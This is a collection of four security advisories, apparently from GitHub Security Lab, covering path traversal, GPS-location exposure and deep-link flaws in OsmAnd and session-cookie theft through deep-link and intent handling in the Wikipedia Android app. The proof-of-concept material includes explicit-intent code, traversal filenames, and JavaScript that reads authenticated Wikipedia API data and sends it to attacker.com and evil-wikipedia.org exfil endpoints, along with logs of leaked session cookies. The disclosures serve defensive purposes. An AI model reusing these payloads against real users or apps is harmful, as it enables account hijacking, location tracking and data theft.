isAppEnabled() auto-approves all callers Every AIDL method is gated by getApi(), which calls isAppEnabled(): public boolean isAppEnabled(@NonNull String pack) { ConnectedApp connectedApp = connectedApps.get(pack); if (connectedApp == null) { connectedApp = new ConnectedApp(app, pack, true); // ← enabled=true connectedApps.put(pack, connectedApp); saveConnectedApps(); } return connectedApp.isEnabled(); // ← always true for first-time callers } This is a permission check that grants the permission it is supposed to enforce. Any unknown caller is auto-registered with enabled=true on first contact. The entry is persisted to API_CONNECTED_APPS_JSON in SharedPreferences (OsmandAidlApi.java#L1956-L1968). Once getApi() returns the OsmandAidlApi singleton, the caller has unrestricted access to all 97 AIDL methods. Vulnerability 1: Path traversal in copyFileImpl() — arbitrary file write/delete Entry point: OsmandAidlServiceV2.copyFile(CopyFileParams params) forwards attacker-controlled destinationDir, fileName, and filePartData to api.copyFileV2(). copyFileV2() — no sanitization: Checks only isEmpty(fileName), null, and length > 256KB. Does not check for .. or path separators in either destinationDir or fileName. copyFileImpl() — the sink (OsmandAidlApi.java#L2572-L2615): private int copyFileImpl(String fileName, byte[] filePartData, long startTime, boolean done, String destinationDir) { File tempDir = FileUtils.getTempDir(app); File file = new File(tempDir, fileName); // line 2574 File destFile = app.getAppPath(new File(destinationDir, fileName).getPath()); // line 2575 ★ // ... } getAppPath() blindly concatenates: public File getAppPath(@Nullable String path) { String child = path != null ? path : ""; return new File(externalStorageDirectory, child); // no canonicalization } finishFileCopy() then deletes the existing file at the traversed destination and renames the temp file onto it: private boolean finishFileCopy(byte[] data, File file, FileOutputStream fos, String fileName, File destFile) throws IOException { // ... if (destFile.exists() && !destFile.delete()) { // line 2622 — DELETE res = false; } if (res && !file.renameTo(destFile)) { // line 2625 — WRITE file.delete(); res = false; } // ... } V1 also vulnerable: copyFile() (V1) checks only fileName.endsWith(".sqlitedb") but does not reject ... A filename like "../poc.sqlitedb" passes the extension check and traverses via copyFileImpl(). Vulnerability 2: GPS location theft via getAppInfo() getAppInfo() returns: AppInfoParams getAppInfo() { ALatLon lastKnownLocation = null; Location location = app.getLocationProvider().getLastKnownLocation(); // line 1831 if (location != null) { lastKnownLocation = new ALatLon(location.getLatitude(), location.getLongitude()); } // ... ALatLon mapLocation = new ALatLon(mapLoc.getLatitude(), mapLoc.getLongitude()); // line 1841 // ... destinationLocation = new ALatLon(latLon.getLatitude(), latLon.getLongitude()); // line 1855 // ... } This returns: lastKnownLocation — the device’s real-time GPS coordinates (from OsmAnd’s LocationProvider, which uses OsmAnd’s own ACCESS_FINE_LOCATION permission) mapLocation — where the user is currently looking on the map destinationLocation — the user’s navigation destination (if routing is active) leftDistance, leftTime, arrivalTime — full route state Combined with registerForUpdates(1000, callback) (minimum 1-second interval), the attacker polls getAppInfo() on each tick for continuous real-time GPS tracking — all from a zero-permission app that never requested ACCESS_FINE_LOCATION. Additional data exfiltration via the same auto-enable bypass The same isAppEnabled() auto-approve grants access to: getImportedGpxV2() — enumerates all GPX track files with full metadata: start/end timestamps, total distance, speed (min/avg/max), elevation profile, waypoint counts. Track filenames often encode dates and place names. This is complete movement-history catalogue access. registerLogcatListener() — executes Runtime.exec("logcat", filterLevel, "--pid=" + myPid(), "-T", "10000") and streams OsmAnd’s process logs (last 10,000 lines of history + live tail) to the calling app. OsmAnd logs raw lat/lon coordinates at debug level, search queries, navigation events, and map download selections. Impact A zero-permission malicious app installed on the same device can: Steal real-time GPS location without ACCESS_FINE_LOCATION by polling getAppInfo() every second — enabling stalkerware-grade tracking. Write arbitrary files within OsmAnd’s storage sandbox via path traversal in copyFileImpl() — overwriting map data, GPX tracks, favorites, or (on internal-storage mode) SharedPreferences. Delete arbitrary files within OsmAnd’s sandbox — finishFileCopy() deletes the destination file before attempting renameTo(), so even a failed rename still destroys the target. Enumerate complete movement history via getImportedGpxV2() — when, how far, how fast, at what altitude the user has traveled. Stream OsmAnd’s full process logcat including GPS coordinates, search queries, and navigation events. CWEs CWE-22: “Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)” CWE-862: “Missing Authorization” CWE-200: “Exposure of Sensitive Information to an Unauthorized Actor” CWE-926: “Improper Export of Android Application Components” Proof of Concept A proof of concept was created with the following operations. The source code of the entire application can be requested. Buttons: Button What it does Verification 1. Bind bindService() to OsmandAidlServiceV2 — auto-enabled by isAppEnabled() Logs CONNECTED + AUTO-ENABLED E3. getAppInfo() Calls getAppInfo() → returns lastKnownLocation (GPS lat/lon), mapLocation, destinationLocation Displays coordinates + OpenStreetMap link E3-live registerForUpdates(1000ms) + polls getAppInfo() each tick → continuous GPS tracking GPS fixes stream every ~1 second E2. logcat registerForLogcatMessages("*:D") → OsmAnd’s full process logcat streamed to PoC 10k-line history dump + live tail 2A. Traversal copyFile with destinationDir=".." → file written above the storage root adb shell ls /sdcard/Android/data/<pkg>/GHSL_traversal_proof_*.txt GPS theft demo (E3): ██ GPS LOCATION ██ ██ lat = 37.4219983 ██ lon = -122.084 ██ https://www.openstreetmap.org/?mlat=37.42&mlon=-122.08#map=15/37.42/-122.08 Path traversal demo (2A): [*] copyFile() -> 0 (OK_RESPONSE) [!!!] TRAVERSAL CONFIRMED — file written ABOVE storage root. Verify: adb shell ls -la /sdcard/Android/data/net.osmand.plus/GHSL_traversal_proof_1.txt adb shell cat /sdcard/Android/data/net.osmand.plus/GHSL_traversal_proof_1.txt CVE CVE-2026-65995 Credit This issue was discovered and reported by GHSL team member @Kwstubbs (Kevin Stubbings). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-109 in any communication regarding this issue.

items.summary: Coordinated Disclosure Timeline 2026-03-30: Vulnerability reported at https://phabricator.wikimedia.org/T421794. 2026-04-07: Phabricator issue merged into https://phabricator.wikimedia.org/T421795 and closed. Summary The Wikimedia Android app (apps-android-wikipedia) allowed an explicit intent to the exported PageActivity, allowing an attacker to load arbitrary webpages. Using a local application, an attacker can load a malicious webpage that steals session cookies and leaks personal information. Project apps-android-wikipedia Tested Version latest Details Intent Redirection via Exported PageActivity Donation Thank-You Flow Leads to WebView Takeover (GHSL-2026-103) The exported PageActivity accepts ACTION_VIEW intents from any application on the device. Its handleIntent() method contains a donation thank-you code path that passes the full attacker-controlled URI to SingleWebViewActivity without any domain validation. A malicious app on the device can send an explicit intent with a crafted URL that satisfies three non-security checks — causing the Wikipedia app to load arbitrary attacker-controlled content in an internal WebView with JavaScript enabled and a cookie-proxying OkHttpWebViewClient. Attack flow: A malicious app sends an explicit intent to PageActivity: Intent(Intent.ACTION_VIEW).apply { setClassName("org.wikipedia", "org.wikipedia.page.PageActivity") data = Uri.parse("https://thankyou.attacker.com/phish?order_id=1&wmf_campaign=Android") } WikiSite(uri) calls authorityToLanguageCode("thankyou.attacker.com"), which splits on dots and returns the first part: "thankyou". At PageActivity.kt:540, "thankyou" matches an entry in NON_LANGUAGE_SUBDOMAINS. At PageActivity.kt:543-552, the donation-completion checks pass: language == "thankyou", order_id query parameter is present, and wmf_campaign == "Android". At PageActivity.kt:560, the full attacker URI (uri.toString()) is passed to SingleWebViewActivity.newIntent(): startActivity(SingleWebViewActivity.newIntent(this@PageActivity, uri.toString(), true, pageFragment.title, pageContentInfo)) SingleWebViewActivity: Enables JavaScript (javaScriptEnabled = true) Calls setCookies(targetUrl) which invokes SharedPreferenceCookieManager.loadForRequest() with the attacker URL Loads the attacker URL in a WebView with OkHttpWebViewClient No domain validation exists anywhere in this path Impact SOP bypass via OkHttpWebViewClient: SingleWebViewActivity uses OkHttpWebViewClient, which intercepts all http/https subresource requests, proxies them through OkHttpConnectionFactory.client (which has SharedPreferenceCookieManager attached as its cookie jar), and unconditionally injects Access-Control-Allow-Origin: * on every response: // OkHttpWebViewClient.kt:135 private fun addResponseHeaders(headers: Headers): Headers { return headers.newBuilder().set("Access-Control-Allow-Origin", "*").build() } Because cookies are injected by OkHttp behind the WebView’s back (not via credentials: 'include'), the WebView treats these as non-credentialed requests and the wildcard CORS header passes. Attacker JavaScript running at https://thankyou.attacker.com can therefore call fetch() against authenticated Wikipedia API endpoints and read the response body: // Running inside SingleWebViewActivity at https://thankyou.attacker.com: fetch('https://en.wikipedia.org/w/api.php?action=query&meta=userinfo&uiprop=email|groups&format=json') .then(r => r.json()) .then(data => { // data.query.userinfo contains: name, email, groups, registration date navigator.sendBeacon('https://thankyou.attacker.com/exfil', JSON.stringify(data)); }); Content spoofing / phishing: Attacker HTML is rendered inside the Wikipedia app’s SingleWebViewActivity with a toolbar and back button but no URL bar. The user sees what appears to be legitimate Wikipedia app content (e.g., a fake donation receipt, a fake login form). This is a convincing trusted-context phishing vector. Authenticated data exfiltration (SOP bypass): Via the OkHttpWebViewClient proxy, attacker JavaScript can make authenticated cross-origin requests to en.wikipedia.org API endpoints and read the responses. This allows silent exfiltration of the victim’s email address, user groups (sysop, bureaucrat, checkuser, etc.), watchlist, CSRF tokens, private drafts, and any other API-accessible data. Session cookie exposure: SharedPreferenceCookieManager.loadForRequest() unconditionally transfers centralauth_* cookies from stored Wikipedia domains to any request URL. When OkHttpWebViewClient fetches the attacker-controlled page, its OkHttp client invokes this cookie jar and sends those cookies directly to the attacker’s server. CWEs CWE-940: “Improper Verification of Source of a Communication Channel” CWE-601: “URL Redirection to Untrusted Site” CWE-668: “Exposure of Resource to Wrong Sphere” Proof Of Concept PoC App A minimal Android app sends an explicit intent to the Wikipedia app’s exported PageActivity: Intent intent = new Intent(Intent.ACTION_VIEW); intent.setClassName("org.wikipedia.dev", "org.wikipedia.page.PageActivity"); intent.setData(Uri.parse( "https://thankyou.evil-wikipedia.org/wiki/PoC" + "?order_id=1&wmf_campaign=Android&amount=5¤cy=USD")); startActivity(intent); Attacker Server ############################################################################## # EXFIL from attacker JS inside the Wikipedia WebView ############################################################################## [+] GET /wiki/PoC?order_id=1&wmf_campaign=Android&amount=5¤cy=USD Host: thankyou.evil-wikipedia.org UA : WikipediaApp/50575-dev-2026-03-26 (Android 13; Phone; sdk_gphone64_arm64 Build/TE1A.240213.009) Developer Channel >>> COOKIE LEAK <<< GeoIP= WMF-Uniq=m0eIVdc36nUFZ6np7T2rfgMwAAEBAFvdz1bTEWc58FY9N9FZHH3jmmCI063r6_2T WMF-Last-Access-Global=30-Mar-2026 [!!!] centralauth_User=Kuzzs [!!!] centralauth_Token= [!!!] centralauth_Session= ############################################################################## CVE CVE-2026-65994 Credit This issue was discovered and reported by GHSL team member @Kwstubbs (Kevin Stubbings). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-103 in any communication regarding this issue.

items.summary: Coordinated Disclosure Timeline 2026-04-14: Sent reports via email to support@osmand.net 2026-06-28: Maintainer confirmed all vulnerabilities fixed. Summary OsmAnd version OsmAnd_5.3.2 is vulnerable to a path traversal issue (GHSL-2026-106) via the /open-gpx deep link, allowing a remote attacker to retrieve arbitrary URLs from the device’s network context and write attacker-controlled .gpx files to arbitrary locations within OsmAnd’s scoped storage directory. Project OsmAnd Tested Version 3043c92b27b24a0b2c848bc7041cf5f69ede4ed6 OsmAnd_5.3.2 Details Path traversal and arbitrary URL download via the /open-gpx deep link (GHSL-2026-106) OsmAnd registers an intent filter for https://osmand.net/open-gpx?url=&name= deep links in its AndroidManifest.xml. When this deep link is opened, MapActivity dispatches the intent to IntentHelper.parseOpenGpxIntent(): Path Traversal in name Parameter (CWE-22) The name query parameter is used as the output filename without sanitization: String name = data.getQueryParameter("name"); if (Algorithms.isEmpty(name)) { name = Algorithms.getFileWithoutDirs(url); // Only sanitized in this fallback } if (!name.endsWith(IndexConstants.GPX_FILE_EXT)) { name += IndexConstants.GPX_FILE_EXT; } String fileName = name; AndroidNetworkUtils.downloadFileAsync(url, app.getAppPath(IndexConstants.GPX_IMPORT_DIR + fileName), ...); Note that Algorithms.getFileWithoutDirs() (which strips directory separators) is only called when name is empty — when the attacker supplies a name parameter, it is used directly. The destination path resolves to: new File(externalStorageDirectory, "tracks/import/" + name) A name value of ../../poc_escaped.gpx resolves to externalStorageDirectory/poc_escaped.gpx, escaping the intended tracks/import/ directory. The attacker can write .gpx files to any location within OsmAnd’s scoped external storage directory, including: favorites/ — user’s saved locations (Home, Work, frequently visited places) routing/ — routing configuration files rendering/ — rendering/style files tracks/ — user’s GPX recordings The file must end with .gpx (enforced at line 607–608), but this is not a meaningful restriction since OsmAnd stores favorites, itineraries, and track data all as .gpx files. Remote Triggerability The intent filter at AndroidManifest.xml declares android.intent.category.BROWSABLE, making the deep link openable from a web browser. On Play-Store-signed builds, osmand.net passes Android App Link verification (the assetlinks.json lists both net.osmand and net.osmand.plus), so on Android 12+ the link is dispatched silently to OsmAnd with no user prompt beyond the initial tap. A malicious app on the same device can also trigger this without any browser interaction: Intent intent = new Intent(Intent.ACTION_VIEW); intent.setData(Uri.parse("https://osmand.net/open-gpx?url=http://attacker.com/payload&name=../../favorites/favorites-personal.gpx")); startActivity(intent); Impact Arbitrary file write within OsmAnd’s storage: Attacker-controlled content is written to unintended locations in OsmAnd’s scoped external storage directory (/sdcard/Android/data/net.osmand/files/). On Android 11+, scoped storage confines writes to OsmAnd’s own directory. However, the attacker can write to any subdirectory within it, including favorites/, tracks/, routing/, and rendering/. Practical impact limitations: OsmAnd’s internal architecture limits the real-world exploitability of the path traversal for overwriting existing data: Favorites (favorites/*.gpx): OsmAnd maintains an internal backup at app.getFileStreamPath("favourites_bak.gpx"). On startup, FavouritesHelper.loadFavorites() loads the internal backup first, then merges external groups. The merge logic only copies appearance for existing points — coordinates are preserved from the internal backup. This prevents overwriting existing Home/Work locations. However, new favorites can be injected via the additive merge (writing to a new group file like favorites-Hacked.gpx), and on a fresh install (no internal backup yet), the external file is the sole source of truth. Map markers (itinerary.gpx): No internal backup exists, but syncAllGroups() runs during app initialization and re-saves from in-memory state, creating a race condition that the async download typically loses. Tracks: Writing new track files into tracks/ is possible, but they only appear in the track listing — not on the map — unless the user explicitly selects them. CWEs CWE-22: “Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)” Proof of Concept link text The following HTML can be added to an attacker page. When clicked, OsmAnd downloads the hosted favorites-personal.gpx, whose entries will be added to My Places. CVE CVE-2026-65996 Credit This issue was discovered and reported by GHSL team member @Kwstubbs (Kevin Stubbings). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-106 in any communication regarding this issue.

items.summary: Coordinated Disclosure Timeline 2026-03-30: Vulnerability reported at https://phabricator.wikimedia.org/T421795 2026-04-14: Vulnerabilities fixed and tested by maintainers. 2026-05-08: Phabricator issue closed. Summary The apps-android-wikipedia project in its latest version is vulnerable to improper host validation in the wikipedia:// deep link handler (GHSL-2026-101), potentially allowing attackers to exploit this flaw to steal session tokens and compromise user accounts. Project apps-android-wikipedia Tested Version latest Details Improper Host Validation in wikipedia:// Deep Link Handler Enables Session Token Theft (GHSL-2026-101) The Wikipedia for Android app handles wikipedia:// deep links in MainActivity.handleIntent() by validating the URI authority with String.endsWith(): // MainActivity.kt:144 if (it.authority.orEmpty().endsWith(WikiSite.BASE_DOMAIN)) { val uri = Uri.parse(it.toString().replace("wikipedia://", WikiSite.DEFAULT_SCHEME + "://")) startActivity(Intent(this, PageActivity::class.java) .setAction(Intent.ACTION_VIEW) .setData(uri)) } where WikiSite.BASE_DOMAIN is "wikipedia.org". The endsWith() check does not verify a dot boundary (or exact match), so any domain ending with the literal string wikipedia.org passes validation — for example, evil-wikipedia.org or notwikipedia.org. The manifest declares the wikipedia:// scheme with BROWSABLE category and no host restriction: This means any web page, QR code, NFC tag, or installed app can fire wikipedia://evil-wikipedia.org/wiki/Article and it will be delivered to the Wikipedia app directly. Because the Wikipedia app is the only handler for the wikipedia:// scheme, Android launches it with no disambiguation dialog — the user sees the Wikipedia app open normally. This single entry-point bug chains into multiple independent impacts: Finding 1 (Critical): CentralAuth Session Cookie Theft After passing the endsWith check, the URI is rewritten from wikipedia://evil-wikipedia.org/... to https://evil-wikipedia.org/... and passed to PageActivity. The WikiSite(uri) constructor preserves the attacker’s authority because evil-wikipedia.org has only 2 dot-separated parts, yielding languageCode = "". The subdomain-rewrite guard at line 82 (subdomain().isNotEmpty()) is false, so the authority remains evil-wikipedia.org. ServiceFactory then builds the REST base URL from wiki.url() = https://evil-wikipedia.org, and all API requests are sent to the attacker’s server via OkHttpConnectionFactory.client, which has SharedPreferenceCookieManager attached as its cookie jar. In loadForRequest(), stored cookies are matched using the same flawed endsWith pattern: // SharedPreferenceCookieManager.kt:101 if (domain.endsWith(domainSpec)) { buildCookieList(cookieList, cookiesForDomainSpec, null) } Wikipedia’s CentralAuth cookies are stored under domainSpec = "wikipedia.org". Since "evil-wikipedia.org".endsWith("wikipedia.org") is true, all .wikipedia.org-scoped cookies are sent to the attacker, including: centralauth_Session — active session identifier centralauth_Token — long-lived “remember me” token (~30 days, survives per-site logout) centralauth_User — username These are global SSO cookies valid across every Wikimedia project (all Wikipedias, Commons, Wikidata, Meta, etc.). Finding 2 (High): Same-Origin Policy Bypass — Authenticated Cross-Origin Read The article WebView uses OkHttpWebViewClient which intercepts all http/https subresource requests via shouldInterceptRequest(), proxies them through the same OkHttpConnectionFactory.client (with the cookie jar), and then unconditionally injects Access-Control-Allow-Origin: * on every response: // OkHttpWebViewClient.kt:135 private fun addResponseHeaders(headers: Headers): Headers { return headers.newBuilder().set("Access-Control-Allow-Origin", "*").build() } Because cookies are injected by OkHttp behind the WebView’s back (not via credentials: 'include'), the WebView treats these as non-credentialed requests. The wildcard CORS header passes. Attacker JavaScript running at https://evil-wikipedia.org can therefore fetch() authenticated Wikipedia API endpoints and read the response body: // Running inside the Wikipedia app's WebView at https://evil-wikipedia.org: fetch('https://en.wikipedia.org/w/api.php?action=query&meta=userinfo&uiprop=email|groups&format=json') .then(r => r.json()) .then(data => { // data.query.userinfo contains: name, email, groups, registration date navigator.sendBeacon('https://evil-wikipedia.org/exfil', JSON.stringify(data)); }); This allows the attacker to read the victim’s email address, user groups (sysop, bureaucrat, checkuser, etc.), watchlist, CSRF tokens, private drafts, and any other authenticated API data — all from attacker-controlled JavaScript, without the victim’s knowledge. Finding 3 (Medium): Content Spoofing via Exposed @JavascriptInterface Bridge The article WebView enables JavaScript and exposes a pcsClient @JavascriptInterface: // CommunicationBridge.kt:52-56 communicationBridgeListener.webView.settings.javaScriptEnabled = true communicationBridgeListener.webView.settings.allowUniversalAccessFromFileURLs = true communicationBridgeListener.webView.addJavascriptInterface(PcsClientJavascriptInterface(), "pcsClient") The attacker’s HTML is loaded into the same WebView that normally renders trusted Wikipedia PCS content. The entire article area is under attacker control while the surrounding native UI (toolbar, Wikipedia logo, save button, tabs) remains the real app — creating a convincing trusted context for phishing or misinformation. The pcsClient bridge exposes two methods to attacker JS: pcsClient.getSetupSettings() — synchronously returns a JSON blob containing AccountUtil.groups (reveals if victim is sysop, checkuser, etc.), client version, theme, and preferences. This is an information disclosure that also enables target selection. pcsClient.onReceiveMessage(json) — drives native event handlers registered in PageFragment.setupMessageHandlers(). Attacker JS can dispatch: {"action":"link", "data":{"href":"https://attacker.example/phish"}} → LinkHandler.onUrlClick() → UriUtil.visitInExternalBrowser() → startActivity(Intent(ACTION_VIEW, uri)) — opens arbitrary URLs in the default browser or fires implicit intents (including geo:, mailto:, Play Store links) {"action":"pronunciation", "data":{"url":"https://attacker/track"}} → AvPlayer.play(url) — autoplay audio from attacker URL (tracking, annoyance) {"action":"footer_item", "data":{"itemType":"talkPage"}} → opens Talk page activity with attacker-controlled WikiSite Impact Session hijacking: Attacker captures CentralAuth SSO cookies and can impersonate the victim across all ~800 Wikimedia projects. With the session, the attacker can edit articles, read the victim’s email address, access watchlists, send wiki-emails as the victim, and — if the victim has elevated rights — delete pages, block users, or perform oversight actions. Authenticated data exfiltration: Via the SOP bypass, attacker JavaScript can silently read the victim’s email, user groups, watchlist, CSRF tokens, private drafts, and any API-accessible data, then exfiltrate it without any visible indication. Content spoofing / phishing: Pixel-perfect fake Wikipedia articles rendered inside the real app’s trusted chrome. Can display fake “re-enter password” prompts, misinformation, or defamatory content attributed to Wikipedia. 1-click, no-dialog attack: The Wikipedia app is the sole handler for wikipedia://, so Android launches it directly from a browser tap with no disambiguation or confirmation dialog. CWEs CWE-939: “Improper Authorization in Handler for Custom URL Scheme” CWE-200: “Exposure of Sensitive Information to an Unauthorized Actor” CWE-668: “Exposure of Resource to Wrong Sphere” (SOP bypass) CWE-451: “User Interface (UI) Misrepresentation of Critical Information” (content spoofing) CWE-749: “Exposed Dangerous Method or Function” (@JavascriptInterface bridge) Proof Of Concept The following files are used for this exploit: File Purpose poc_server.py HTTPS listener that (1) logs leaked cookies from OkHttp requests, (2) serves a weaponized mobile-html page that triggers the PCS bridge handshake, demonstrates the SOP bypass, and exfiltrates data attack.html Web-deliverable trigger page with links demonstrating the 1-click browser-to-app attack vector First, we register a malicious domain. In this case, we use evil-wikipedia.org. attack.html 📖 Open this article in the Wikipedia app A user is led to attack.html and asked to click a button, sending them to evil-wikipedia.org within the Android app. No confirmation dialog is presented after clicking. poc_server.py The vulnerable flow: wikipedia://evil-wikipedia.org/wiki/PoC -> MainActivity.handleIntent: "evil-wikipedia.org".endsWith("wikipedia.org") == true -> rewritten to https://evil-wikipedia.org/wiki/PoC -> PageActivity -> WikiSite(uri) keeps authority = evil-wikipedia.org (2 dot-parts -> languageCode="") -> ServiceFactory.getRest(wiki) baseUrl = https://evil-wikipedia.org/api/rest_v1/ -> OkHttp CookieJar.loadForRequest("evil-wikipedia.org"): domainSpec "wikipedia.org" in jar "evil-wikipedia.org".endsWith("wikipedia.org") == true -> ALL .wikipedia.org-scoped cookies attached, incl. centralauth_* poc_server.py then hosts the javascript to attack the Android app. Its full contents are not in this report, but can be requested. Observed Results Cookie theft (Finding 1) — The server immediately logs all CentralAuth cookies: ============================================================================== [+] GET /api/rest_v1/page/summary/PoC Host: evil-wikipedia.org >>> COOKIE LEAK <<< [!!!] centralauth_User=Kuzzs [!!!] centralauth_Token=xxxxxxxxxxxxxx [!!!] centralauth_Session=xxxxxxxxxxxx ============================================================================== SOP bypass (Finding 2) — The injected JavaScript calls fetch('https://en.wikipedia.org/w/api.php?action=query&meta=userinfo&uiprop=email|groups|rights&format=json') and reads the authenticated response cross-origin: ############################################################################## # EXFIL from attacker JS inside the Wikipedia WebView ############################################################################## { "batchcomplete": true, "query": { "userinfo": { "id": 53013219, "name": "Kuzzs", "groups": [ "*", "user" ], "rights": [ "createaccount", "read", "edit", "createtalk", "viewmyprivateinfo", ... ], "email": "[redacted]", "emailauthenticated": "2026-03-27T05:49:29Z", "registrationdate": "2026-03-27T05:49:10Z" } } } ############################################################################## Bridge info leak (Finding 3) — pcsClient.getSetupSettings() returns user groups and app configuration with zero interaction: ############################################################################## # EXFIL from attacker JS inside the Wikipedia WebView ############################################################################## out-B --- userGroups: ["*","user"] --- { "platform": "android", "clientVersion": "50575-dev-2026-03-26", "userGroups": ["*", "user"], "isEditable": true, ... } ############################################################################## CVE CVE-2026-65993 Credit This issue was discovered and reported by GHSL team member @Kwstubbs (Kevin Stubbings). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-101 in any communication regarding this issue.
